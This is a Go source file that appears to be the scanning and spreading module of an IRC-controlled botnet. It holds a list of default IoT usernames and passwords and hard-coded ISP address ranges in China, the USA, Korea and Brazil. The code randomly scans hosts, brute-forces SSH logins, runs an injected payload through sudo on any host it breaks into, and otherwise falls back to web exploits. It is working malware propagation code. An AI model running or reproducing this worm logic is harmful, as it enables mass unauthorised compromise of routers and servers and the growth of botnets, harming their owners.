package lib

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	wg         sync.WaitGroup
	coreReport *string
	randomNet  string //0.0.0.0/0
	/*
		Add more usernames and passwords to the slice name "userList" and "paswdList".
	*/
	userList  = []string{"admin", "root", "user", "guest", "support", "login"}
	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "pass", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "Admin1234", "admin12345", "Admin12345", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp"}
)

var China_Network = []string{

	//CHINANET jiangsu province network

	"49.69",   //49.69.0.0/16
	"49.76",   //49.76.0.0/16
	"49.81",   //49.81.0.0/16
	"49.83",   //49.83.0.0/16
	"58.208",  //58.208.0.0/16
	"114.216", //114.216.0.0/16
	"114.218", //114.218.0.0/16
	"114.230", //114.230.0.0/16
	"117.63",  //117.63.0.0/16
	"121.228", //121.228.0.0/16
	"180.116", //180.116.0.0/16
	"221.224", //221.224.0.0/16
	"221.228", //221.228.0.0/16
	"221.230", //221.230.0.0/16

	//CHINANET-ZJ Hangzhou node network

	"36.24",   //36.24.0.0/16
	"60.176",  //60.176.0.0/16
	"60.177",  //60.177.0.0/16
	"60.186",  //60.186.0.0/16
	"115.194", //115.194.0.0/16
	"115.196", //115.196.0.0/16
	"115.198", //115.198.0.0/16
	"115.199", //115.199.0.0/16
	"125.119", //125.119.0.0/16
	"122.231", //122.231.0.0/16
	"183.128", //183.128.0.0/16
	"183.157", //183.157.0.0/16
	"183.158", //183.158.0.0/16
	"220.184", //220.184.0.0/16

	//China Mobile Communications Corporation

	"111.21",  //111.21.0.0/16
	"111.43",  //111.43.0.0/16
	"111.47",  //111.47.0.0/16
	"111.48",  //111.48.0.0/16
	"111.59",  //111.59.0.0/16
	"112.48",  //112.48.0.0/16
	"117.156", //117.156.0.0/16
	"120.196", //120.196.0.0/16
	"120.226", //120.226.0.0/16
	"120.245", //120.245.0.0/16
	"183.222", //183.222.0.0/16
	"183.230", //183.230.0.0/16
	"183.232", //183.232.0.0/16
	"183.238", //183.238.0.0/16
	"223.71",  //223.71.0.0/16

	//CHINANET Guangdong province network

	"58.63",   //58.63.0.0/16
	"61.141",  //61.141.0.0/16
	"106.110", //106.110.0.0/16
	"113.64",  //113.64.0.0/16
	"113.67",  //113.67.0.0/16
	"113.68",  //113.68.0.0/16
	"113.73",  //113.73.0.0/16
	"113.83",  //113.83.0.0/16
	"113.87",  //113.87.0.0/16
	"113.88",  //113.88.0.0/16
	"113.99",  //113.99.0.0/16
	"113.104", //113.104.0.0/16
	"113.105", //113.105.0.0/16
	"113.116", //113.116.0.0/16
	"119.146", //119.146.0.0/16
	"219.131", //219.131.0.0/16
	"219.137", //219.137.0.0/16
}

var USA_Network = []string{

	//CenturyLink Communications, LLC

	"40.129",  //40.129.0.0/16
	"67.2",    //67.2.0.0/16
	"67.6",    //67.6.0.0/16
	"69.136",  //69.136.0.0/16
	"71.34",   //71.34.0.0/16
	"71.210",  //71.210.0.0/16
	"71.223",  //71.223.0.0/16
	"73.131",  //73.131.0.0/16
	"75.173",  //75.173.0.0/16
	"76.133",  //76.133.0.0/16
	"98.63",   //98.63.0.0/16
	"104.129", //104.129.0.0/16
	"104.224", //104.224.0.0/16
	"107.152", //107.152.0.0/16
	"152.44",  //152.44.0.0/16
	"204.134", //204.134.0.0/16

	//Charter Communications

	"68.185",  //68.185.0.0/16
	"70.119",  //70.129.0.0/16
	"71.8",    //71.8.0.0/16
	"71.82",   //71.82.0.0/16
	"72.174",  //72.174.0.0/16
	"72.176",  //72.176.0.0/16
	"75.133",  //75.133.0.0/16
	"98.30",   //98.30.0.0/16
	"150.220", //150.220.0.0/16
}

var Korea_Network = []string{

	//Korea Telecom

	"14.61",   //14.61.0.0/16
	"218.155", //218.155.0.0/16
	"27.236",  //27.236.0.0/16
	"27.238",  //27.238.0.0/16
	"125.153", //125.153.0.0/16
	"125.157", //125.157.0.0/16
	"119.212", //119.212.0.0/16
	"119.221", //119.221.0.0/16
	"175.239", //175.239.0.0/16
	"175.203", //175.203.0.0/16

	//SK Broadband, Inc.

	"58.122",  //58.122.0.0/16
	"58.124",  //58.124.0.0/16
	"118.221", //118.221.0.0/16
	"118.218", //118.218.0.0/16
	"211.201", //211.201.0.0/16
	"211.54",  //211.54.0.0/16
	"218.38",  //218.38.0.0/16
	"218.101", //218.101.0.0/16
	"175.112", //175.112.0.0/16
	"175.114", //175.114.0.0/16
	"175.124", //175.124.0.0/16
	"1.234",   //1.234.0.0/16
	"1.235",   //1.235.0.0/16

	//LG DACOM Corporation

	"211.60",  //211.60.0.0/16
	"112.216", //112.216.0.0/16
	"112.217", //112.217.0.0/16
	"122.221", //112.221.0.0/16
	"123.143", //123.143.0.0/16
	"106.242", //106.242.0.0/16
	"106.245", //106.245.0.0/16
	"1.211",   //1.211.0.0/16
	"1.215",   //1.215.0.0/16
	"118.130", //118.130.0.0/16
	"58.149",  //58.149.0.0/16

	//LGTELECOM

	"223.171", //223.171.0.0/16
}

var Brazil_Network = []string{

	//CLARO S.A.

	"177.127", //177.127.0.0/16
	"177.193", //177.193.0.0/16
	"179.214", //179.214.0.0/16
	"187.105", //187.105.0.0/16
	"187.28",  //187.28.0.0/16
	"189.17",  //189.17.0.0/16
	"189.22",  //189.22.0.0/16
	"200.166", //200.166.0.0/16
	"200.179", //200.179.0.0/16
	"200.209", //200.209.0.0/16
	"200.230", //200.230.0.0/16
	"201.31",  //201.31.0.0/16
	"201.57",  //201.57.0.0/16

	//TELEFÔNICA BRASIL S.A

	"177.43",  //177.43.0.0/16
	"177.99",  //177.99.0.0/16
	"177.207", //177.207.0.0/16
	"179.80",  //179.80.0.0/16
	"179.85",  //179.85.0.0/16
	"179.150", //179.150.0.0/16
	"187.9",   //187.9.0.0/16
	"187.74",  //187.74.0.0/16
	"187.93",  //187.93.0.0/16
	"189.108", //189.108.0.0/16
	"191.210", //191.210.0.0/16
	"191.32",  //191.32.0.0/16
}

var Random_Network = []string{randomNet}
var ipGen []string

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func manageRange(arr []string, times, elements int) string {
	for i := 0; i < times; i++ {
		arr = append(arr, genRange(255, 0), ".")
	}
	arr[len(arr)-1] = ""
	return strings.Join(arr[0:elements], "")
}

func setScanSwitch() {
	if setCall, setKey := SetupCaller(); setKey {
		setCall.CallBot.scanSwitch = true
	}
}

func sshConfig(sshUser, sshPaswd string) *ssh.ClientConfig {
	authConfig := &ssh.ClientConfig{
		User: sshUser,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPaswd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return authConfig
}

func (b *Bot) sshExecute(comd string) {
	sshSesh, _ := b.session.NewSession()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession
	sshSesh.Run("echo '" + b.password +
		"' | sudo -S -- sh -c '" + comd + "'")
	sshSesh.Close()
}

func (b *Bot) checkPort(ipAddr, port string) string {
	b.timeout = 350 * time.Millisecond
	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
	if err != nil {
		return ""
	}
	defer conn.Close()
	return ipAddr
}

func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) bool {
	for {
		for net := range scanNetwork {
			if isRandom {
				netID := genRange(254, 1) + "."
				if _, key := BlacklistIPs[netID]; key {
					continue
				}
				Random_Network[0] = netID + genRange(255, 0)
			}
			b.network = scanNetwork[net]
			nextIP := manageRange(append(ipGen, b.network, "."), 2, 7)
			ptrIP := &nextIP

			if rtnIP := b.checkPort(*ptrIP, "22"); rtnIP == "" {
				/*
					Non-checking on the injection process of the exploit!!!
				*/
				if b.checkPort(*ptrIP, "80") != "" || b.checkPort(*ptrIP, "8080") != "" {
					b.tempIP = *ptrIP
					b.exploitList()
				}
				b.checkPort(nextIP, "22")
			} else {
				var isLogin bool
				b.tempIP = rtnIP
				for user := range userList {
					if isLogin {
						break
					}
					for paswd := range paswdList {
						if callSwitch, keySwitch := SetupCaller(); keySwitch {
							if callSwitch.CallBot.scanSwitch {
								break
							}
						}
						sshConn, err := ssh.Dial("tcp", b.tempIP+":22", sshConfig(userList[user], paswdList[paswd]))
						b.session = sshConn
						b.password = paswdList[paswd]
						if err == nil {
							b.Report(nCores + " Installing payload: " + b.tempIP)
							go b.sshExecute(b.inject("", false)) //Reuse inject function from exploit.
							isLogin = true
							break
						}
						if paswd == len(paswdList)-1 {
							if !isLogin {
								b.Report(nCores + " No auth match: " + b.tempIP)
								b.exploitList()
							}
						}
					}
				}
				continue
			}
			if callSwitch, keySwitch := SetupCaller(); keySwitch {
				if callSwitch.CallBot.scanSwitch {
					return true
				}
			}
		}
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallBot.scanSwitch {
				return true
			}
		}
	}
}

func (b *Bot) scanner() {
	if setCall, setKey := SetupCaller(); setKey {
		if value, key := ScanMap[setCall.CallBot.ScanOpt]; key {
			/*
				Create a concurrence followed by the number of cores in the CPU.

				Why use core to scan instead of thread???
				1) Because I need to be careful about the overheating problem of a bot device even threads in Go are light weight.
				2) For against excess flood on IRC server when bot device or server have more than 4 cores which is equal to core times 2 when using thread.
			*/
			if b.CPU == 1 {
				singleCore := "SINGLE CORE"
				coreReport = &singleCore
			} else {
				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
				coreReport = &multiCores
			}
			/*
				Bind The bot architecture.
			*/
			b.DEFAULT_ARCH = setCall.CallBot.DEFAULT_ARCH
			b.MIPS_ARCH = setCall.CallBot.MIPS_ARCH
			b.ARM_ARCH = setCall.CallBot.ARM_ARCH

			b.Report(*coreReport + " START SCANNING ON " +
				value.scanOptFull + " NETWORK...")

			isBreak := make(chan bool)
			for i := 0; i < b.CPU; i++ {
				wg.Add(1)
				go func(ncpu int) {
					scanStatus := b.setupScanner(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
					if scanStatus {
						isBreak <- scanStatus
						wg.Done()
					}
				}(i)
			}
			if <-isBreak {
				b.Report(*coreReport + " STOP SCANNING ON " +
					value.scanOptFull + " NETWORK!!!")
			}
			wg.Wait()
		}
	}
}
